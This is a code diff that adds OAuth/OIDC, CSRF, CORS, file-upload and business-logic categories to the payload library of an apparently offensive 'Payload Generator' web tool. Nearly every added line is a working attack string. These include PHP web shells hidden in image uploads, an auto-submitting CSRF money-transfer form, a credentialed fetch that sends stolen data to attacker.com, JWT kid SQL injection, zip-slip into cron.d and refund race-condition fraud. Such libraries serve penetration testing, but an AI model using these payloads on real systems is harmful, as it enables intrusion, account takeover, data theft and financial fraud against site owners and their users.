@@ -545,6 +545,100 @@ const CATEGORIES: PayloadCategory[] = [
       { name: "Cache poisoning via CRLF",       payload: `%0d%0aX-Cache-Poison: true`, note: "Inject cache poisoning header" },
     ],
   },
+  {
+    key: "oauth",
+    label: "OAuth / OIDC",
+    description: "OAuth 2.0 and OpenID Connect attack payloads — redirect_uri abuse, state CSRF, token leakage, open redirect chains",
+    color: "text-blue-400",
+    payloads: [
+      { name: "redirect_uri — open redirect",     payload: `?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com`, note: "Try unvalidated redirect_uri" },
+      { name: "redirect_uri — subdomain bypass",  payload: `?redirect_uri=https://evil.com.legit.com/callback` },
+      { name: "redirect_uri — path traversal",    payload: `?redirect_uri=https://legit.com/callback/../../../evil.com` },
+      { name: "redirect_uri — URL fragment",      payload: `?redirect_uri=https://legit.com%23@evil.com/callback` },
+      { name: "redirect_uri — double slash",      payload: `?redirect_uri=https://legit.com//evil.com/callback` },
+      { name: "state CSRF — missing state",       payload: `GET /oauth/authorize?response_type=code&client_id=ID (no state param)`, note: "Missing state = CSRF on auth flow" },
+      { name: "state CSRF — predictable state",   payload: `?state=1234`, note: "Predictable state allows cross-site flow hijack" },
+      { name: "Implicit flow token leak",         payload: `?response_type=token&redirect_uri=https://attacker.com`, note: "Token leaked in URL fragment" },
+      { name: "Authorization code interception",  payload: `Referer: https://attacker.com/page`, note: "Code leaked via Referer header to embedded resource" },
+      { name: "PKCE downgrade (no code_challenge)",payload: `?response_type=code&client_id=ID&redirect_uri=URI (no code_challenge)` },
+      { name: "nonce reuse (OIDC replay)",        payload: `id_token with reused nonce value`, note: "Replay attack on OIDC token" },
+      { name: "iss claim confusion",              payload: `{"iss":"https://evil.com","sub":"admin"}`, note: "Claim confusion when multiple IdPs accepted" },
+      { name: "kid claim SQLi",                   payload: `{"kid":"x' UNION SELECT 'secretkey'--"}`, note: "SQLi via kid header in JWT used for key lookup" },
+      { name: "Mix-up attack — code interception",payload: `Start auth at IdP A, redirect intercepted to evil server posing as IdP B` },
+    ],
+  },
+  {
+    key: "csrf",
+    label: "CSRF",
+    description: "Cross-Site Request Forgery — form auto-submit, JSON CSRF, SameSite bypass, Flash exploitation",
+    color: "text-amber-400",
+    payloads: [
+      { name: "HTML form auto-submit (GET)",      payload: `<img src="https://target.com/delete-account?confirm=yes">` },
+      { name: "HTML form auto-submit (POST)",     payload: `<form method="POST" action="https://target.com/transfer"><input name="amount" value="1000"><input name="to" value="attacker"></form><script>document.forms[0].submit()</script>` },
+      { name: "JSON CSRF via form",               payload: `<form enctype="text/plain" method="POST" action="https://target.com/api"><input name='{"action":"deleteUser","id":' value='1}'></form>` },
+      { name: "CSRF with fetch (CORS allow-all)", payload: `fetch('https://target.com/api/transfer',{method:'POST',body:JSON.stringify({amount:1000}),credentials:'include'})` },
+      { name: "CSRF via iframe auto-reload",      payload: `<iframe src="https://target.com/logout" onload="this.src='https://target.com/transfer?to=attacker&amount=9999'">` },
+      { name: "SameSite=Lax bypass — GET",        payload: `<a href="https://target.com/transfer?to=attacker&amount=9999">click</a>`, note: "GET mutations bypass SameSite=Lax" },
+      { name: "Origin header spoof attempt",      payload: `Origin: https://target.com`, note: "Test if server validates Origin correctly" },
+      { name: "Referer-based bypass",             payload: `Referer: https://target.com.evil.com/page`, note: "Partial match on Referer header" },
+      { name: "Double submit cookie bypass",      payload: `csrf_token=attacker_value (in cookie and param)`, note: "If server only compares cookie to param without server-state" },
+    ],
+  },
+  {
+    key: "cors",
+    label: "CORS Bypass",
+    description: "Cross-Origin Resource Sharing misconfiguration payloads — wildcard, null origin, subdomain bypass",
+    color: "text-teal-400",
+    payloads: [
+      { name: "Null origin",                      payload: `Origin: null`, note: "Some servers reflect null — exploitable from sandboxed iframes" },
+      { name: "Arbitrary origin reflection",      payload: `Origin: https://attacker.com`, note: "If server reflects any Origin with Allow-Credentials: true" },
+      { name: "Trusted domain prefix bypass",     payload: `Origin: https://trusted.com.evil.com`, note: "Prefix match allows attacker subdomain" },
+      { name: "Trusted domain suffix bypass",     payload: `Origin: https://eviltrusted.com`, note: "Suffix match allows attacker domain" },
+      { name: "Subdomain XSS → CORS exploit",     payload: `Compromise sub.trusted.com, then use its Origin to extract sensitive data`, note: "Subdomain takeover enables CORS bypass" },
+      { name: "HTTP downgrade (HTTPS→HTTP CORS)", payload: `Origin: http://trusted.com`, note: "Some servers allow HTTP origin for HTTPS site" },
+      { name: "Exploit via fetch (with creds)",   payload: `fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))` },
+      { name: "CORS with wildcard (*) + creds",   payload: `Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true`, note: "Misconfiguration — browsers block but worth testing" },
+    ],
+  },
+  {
+    key: "file_upload",
+    label: "File Upload Bypass",
+    description: "File upload restriction bypass — MIME type spoofing, extension tricks, polyglot files, path traversal in filename",
+    color: "text-lime-400",
+    payloads: [
+      { name: "PHP in .jpg extension",            payload: `<?php system($_GET['cmd']); ?>`, note: "Upload as shell.jpg if server executes PHP" },
+      { name: "Double extension",                 payload: `shell.php.jpg`, note: "Some servers use first extension for MIME, second for exec" },
+      { name: "Null byte extension (old PHP)",    payload: `shell.php%00.jpg`, note: "PHP < 5.3 truncates at null byte" },
+      { name: "Case variation",                   payload: `shell.PHP`, note: "Windows/IIS may execute .PHP same as .php" },
+      { name: "MIME type spoofing (Content-Type)",payload: `Content-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>` },
+      { name: "SVG with script (XSS)",            payload: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`, note: "Upload as .svg" },
+      { name: "HTML file XSS",                    payload: `<script>alert(1)</script>`, note: "Upload as .html if rendered by server" },
+      { name: "Zip slip (path traversal in zip)", payload: `../../../etc/cron.d/shell`, note: "Filename inside zip traverses directory" },
+      { name: "GIF magic bytes + PHP",            payload: `GIF89a\n<?php system($_GET['cmd']); ?>`, note: "GIF header fools MIME type check, PHP still executes" },
+      { name: "PDF with JavaScript",              payload: `%PDF-1.4\n1 0 obj<</Type /Action /S /JavaScript /JS (app.alert('XSS'))>>`, note: "PDF JS action for XSS in PDF viewers" },
+      { name: "Filename path traversal",          payload: `../../etc/passwd`, note: "Filename parameter used in file system path" },
+      { name: ".htaccess override",               payload: `AddType application/x-httpd-php .jpg`, note: "Upload .htaccess to make JPGs execute as PHP" },
+    ],
+  },
+  {
+    key: "business_logic",
+    label: "Business Logic",
+    description: "Business logic attacks — negative prices, integer overflow, race conditions, forced browsing, workflow bypass",
+    color: "text-violet-400",
+    payloads: [
+      { name: "Negative price/quantity",          payload: `quantity=-1&price=-100`, note: "Negative values that credit the attacker" },
+      { name: "Integer overflow",                 payload: `quantity=9999999999999999`, note: "Overflow to wrap around to 0 or negative" },
+      { name: "Zero price",                       payload: `price=0`, note: "Force zero price on checkout" },
+      { name: "Coupon stacking",                  payload: `Apply same coupon code multiple times`, note: "If client-side coupon validation only" },
+      { name: "Race condition — coupon reuse",    payload: `Send 20 concurrent POST /apply-coupon requests`, note: "Race to reuse single-use coupon" },
+      { name: "Race condition — buy/refund",      payload: `POST /purchase then immediately POST /refund`, note: "Item ships but money returned" },
+      { name: "Forced browsing — skip payment",   payload: `Navigate directly to /order-confirmation without paying` },
+      { name: "Password reset token reuse",       payload: `Use same reset token multiple times if not invalidated` },
+      { name: "Workflow bypass — step skipping",  payload: `POST to /step-4 without completing steps 1-3` },
+      { name: "Mass assignment — role escalation",payload: `{"username":"attacker","role":"admin"}`, note: "Extra fields accepted in user update" },
+      { name: "Time-based price bypass",          payload: `Apply promo code, change system time, checkout` },
+    ],
+  },
 ];
 
 export default function PayloadGen() {
@@ -576,7 +670,7 @@ export default function PayloadGen() {
       <div>
         <h1 className="text-2xl font-bold text-white">Payload Generator</h1>
         <p className="text-white/60 text-sm mt-1">
-          Comprehensive payload library — XSS · SQLi · CMDi · LFI · SSRF · XXE · SSTI · NoSQL · Reverse Shells · WAF Bypass · Prototype Pollution · HTTP Smuggling · GraphQL · Deserialization · CRLF · Open Redirect
+          Comprehensive payload library — XSS · SQLi · CMDi · LFI · SSRF · XXE · SSTI · NoSQL · Reverse Shells · WAF Bypass · HTTP Smuggling · GraphQL · Deserialization · CRLF · Open Redirect · OAuth/OIDC · CSRF · CORS · File Upload · Business Logic
         </p>
       </div>
 
